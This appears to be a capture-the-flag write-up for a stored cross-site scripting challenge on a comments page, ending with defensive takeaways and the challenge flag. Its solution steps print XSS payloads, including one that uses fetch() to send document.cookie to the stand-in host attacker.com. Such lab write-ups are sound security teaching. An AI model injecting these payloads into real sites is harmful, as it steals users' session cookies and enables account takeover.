# XSS Challenge

**Category:** Web  
**Difficulty:** Medium  
**Points:** 200  
**Author:** SPYIREX CTF Team

## Description

Find a way to execute JavaScript code in the admin's browser. The flag is stored in the admin's cookies.

URL: `http://challenge.spyirex.local/comments`

## Solution

### Initial Analysis

The application allows users to post comments that are displayed on a page. We need to test if the input is properly sanitized.

### Approach

Test for reflected or stored XSS vulnerabilities by injecting JavaScript payloads into the comment field.

### Steps to Solve

1. Navigate to the comments page
2. Test basic XSS payload: `<script>alert('XSS')</script>`
3. Find that basic tags are filtered, but event handlers work
4. Use payload: `<img src=x onerror="fetch('http://attacker.com/steal?cookie='+document.cookie)">`
5. Set up a listener to capture the cookie
6. Alternatively, use: `<img src=x onerror="alert(document.cookie)">`
7. Extract the flag from the cookie value

### Payload

```html
<img src=x onerror="alert(document.cookie)">
```

### Flag

```
JCE{xss_c00k13_st34l3r_pr0}
```

## Key Takeaways

- Always encode user inputs when displaying them
- Use Content Security Policy (CSP) headers
- HttpOnly flag on sensitive cookies prevents JavaScript access
- Tools: Browser Developer Tools, Burp Suite
- Technique: Stored XSS can be more dangerous than reflected XSS
